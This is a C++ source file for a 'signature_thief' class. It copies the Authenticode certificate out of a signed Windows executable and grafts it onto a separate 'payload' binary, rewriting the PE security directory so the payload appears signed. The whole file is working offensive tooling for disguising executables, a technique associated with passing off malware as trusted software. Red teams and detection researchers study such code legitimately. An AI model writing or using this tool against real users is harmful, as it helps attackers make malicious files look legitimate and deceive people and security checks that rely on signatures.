#include "signature_thief.hpp"
#include "pe_utils.hpp"

#include <fstream>
#include <stdexcept>
#include <windows.h>

signature_thief::signature_thief(std::filesystem::path payload_path)
    : m_payload_path(std::move(payload_path)) {
}

void signature_thief::process(const std::filesystem::path& signed_pe_path,
                              const std::filesystem::path& output_path) {
    load_payload();
    extract_certificate(signed_pe_path);
    apply_certificate();
    save(output_path);
}

void signature_thief::load_payload() {
    auto result = pe_utils::read_binary_file(m_payload_path);
    if (!result)
        throw std::runtime_error(result.error());

    m_payload = std::move(*result);
}

void signature_thief::extract_certificate(const std::filesystem::path& signed_pe_path) {
    auto result = pe_utils::read_binary_file(signed_pe_path);
    if (!result)
        throw std::runtime_error(result.error());

    auto& buffer = *result;
    auto* security_dir = pe_utils::security_directory(buffer);

    DWORD virtual_address = security_dir->VirtualAddress;
    DWORD cert_size = security_dir->Size;

    if (virtual_address == 0 || cert_size == 0 || virtual_address + cert_size > buffer.size())
        throw std::runtime_error("No valid certificate found in signed PE");

    m_certificate.assign(buffer.begin() + virtual_address, buffer.begin() + virtual_address + cert_size);
}

void signature_thief::apply_certificate() {
    if (m_certificate.empty())
        throw std::runtime_error("Certificate is empty");

    m_payload.resize(pe_utils::align_up(m_payload.size(), pe_utils::certificate_alignment));

    auto cert_offset = static_cast<DWORD>(m_payload.size());

    m_payload.insert(m_payload.end(), m_certificate.begin(), m_certificate.end());

    auto* security_dir = pe_utils::security_directory(m_payload);
    security_dir->VirtualAddress = cert_offset;
    security_dir->Size = static_cast<DWORD>(m_certificate.size());
}

void signature_thief::save(const std::filesystem::path& output_path) const {
    std::ofstream stream(output_path, std::ios::binary);
    if (!stream.is_open())
        throw std::runtime_error("Failed to open output file: " + output_path.string());

    stream.write(reinterpret_cast<const char*>(m_payload.data()),
                 static_cast<std::streamsize>(m_payload.size()));
}